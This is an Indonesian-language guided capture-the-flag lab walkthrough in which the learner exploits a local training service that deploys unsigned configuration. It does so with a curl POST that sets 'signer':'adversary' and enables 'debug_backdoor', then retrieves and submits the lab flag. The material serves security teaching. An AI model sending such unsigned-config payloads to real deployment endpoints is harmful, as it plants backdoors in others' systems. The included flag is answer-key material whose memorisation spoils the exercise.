# Panduan Praktik Terbimbing: Audit Kegagalan Integritas pada DataFlow Analytics

Dalam latihan terarah ini, kamu akan mempraktikkan proses pembuktian kegagalan verifikasi integritas data dan pembaruan konfigurasi pada mesin pemrosesan data **DataFlow Analytics (Enterprise BI & Stream Processing Engine)** yang beroperasi pada `http://127.0.0.1:8018`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8018/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A08","port":8018,"status":"ok"}
   ```
2. Buka peramban web dan akses konsol DataFlow Analytics:
   `http://127.0.0.1:8018/`
3. Perhatikan kartu **Active Streaming Engine Configuration**:
   - Menampilkan konfigurasi resmi yang sah:
     - `version`: `"1.0.0"`
     - `signature_verified`: `true`
     - `signer`: `"dataflow-root-authority"`
     - `debug_backdoor`: `false`
4. Periksa respons langsung dari endpoint REST API:
   ```bash
   curl -s http://127.0.0.1:8018/api/config
   ```

---

### Langkah 2: Analisis Endpoint Deployment Konfigurasi
1. Perhatikan dokumentasi antarmuka untuk rute pembaruan konfigurasi:
   - **Method:** `POST`
   - **Endpoint:** `/api/deploy_update`
   - **Content-Type:** `application/json`
2. **Analisis Celah Integritas:**
   Endpoint ini menerima objek konfigurasi mentah. Apakah backend benar-benar memverifikasi sertifikat kriptografis tanda tangan digital sebelum menerapkan perubahan ke memori kluster (*in-memory hot-loading*)?

---

### Langkah 3: Mengirim Paket Pembaruan Tanpa Tanda Tangan (Unsigned Package Ingestion)
1. Susun payload konfigurasi yang secara eksplisit menyatakan bahwa tanda tangan **TIDAK TERVERIFIKASI** (`signature_verified: false`), berasal dari penyerang luar (`signer: "adversary"`), dan mengaktifkan parameter berbahaya (`debug_backdoor: true`).
2. Kirimkan paket pembaruan melalui terminal menggunakan cURL:
   ```bash
   curl -s -X POST http://127.0.0.1:8018/api/deploy_update \
     -H "Content-Type: application/json" \
     -d '{"version":"2.5.0-exploit","signature_verified":false,"signer":"adversary","params":{"debug_backdoor":true}}'
   ```
3. **Temuan Kritis & Respons Server:**
   ```json
   {
     "status": "applied",
     "message": "Configuration package deployed directly into cluster memory.",
     "active_version": "2.5.0-exploit",
     "backdoor_enabled": true,
     "flag": "ZITERA{1nt3gr1ty_f41lur3_un51gn3d_p4ck4g3}"
   }
   ```
   Server secara naif menerima dan menerapkan konfigurasi palsu tersebut tanpa melakukan penolakan tanda tangan sama sekali!

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Mengapa ini berbahaya?**  
> Backend menyimpan objek konfigurasi dan hanya memeriksa nilai yang dikirim klien tanpa menjalankan fungsi kriptografis seperti `verify_signature(payload, public_key)`. Karena penyerang bisa mengirimkan field JSON apa saja, parameter `debug_backdoor: true` langsung aktif di memori produksi kluster!

---

### Langkah 4: Verifikasi Status Praktik & Pengiriman Flag
1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
   ```bash
   curl -s http://127.0.0.1:8018/practice/verify
   ```
   *Konfirmasi verifikasi:*
   ```json
   {
     "status": "completed",
     "message": "Objective verified! Unsigned configuration package deployed with debug backdoor active."
   }
   ```
2. Muat ulang halaman web pada `http://127.0.0.1:8018/` dan amati bahwa konfigurasi kluster kini menampilkan status peringatan berbahaya dengan versi `2.5.0-exploit`.
3. Salin bendera validasi autoritatif:
   `ZITERA{1nt3gr1ty_f41lur3_un51gn3d_p4ck4g3}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
